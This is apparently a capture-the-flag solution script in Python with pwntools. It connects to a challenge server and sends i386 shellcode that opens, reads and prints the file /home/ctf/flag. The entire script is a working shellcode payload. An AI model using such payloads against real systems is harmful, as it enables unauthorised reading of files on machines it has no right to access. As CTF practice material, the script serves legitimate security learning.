#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

ip = "bamboofox.cs.nctu.edu.tw"
port = 11100
r = remote(ip,port)

context.arch = 'i386'

shellcode = asm('''
open:
xor ecx, ecx
xor edx, edx
mov eax, 0x67611111
shr eax, 16
push eax
push 0x6c662f66
push 0x74632f65
push 0x6d6f682f
mov ebx, esp
xor eax, eax
inc eax
inc eax
inc eax
inc eax
inc eax
int 0x80
read:
mov ebx, eax
mov ecx, esp
xor edx, edx
inc edx
shl edx, 8
xor eax, eax
inc eax
inc eax
inc eax
int 0x80
write:
mov edx, eax
xor eax, eax
inc eax
inc eax
inc eax
inc eax
xor ebx, ebx
inc ebx
int 0x80
''')
# /home/ctf/flag  =>  0x2f686f6d 652f6374 662f666c 6167
r.sendline(shellcode)
r.interactive()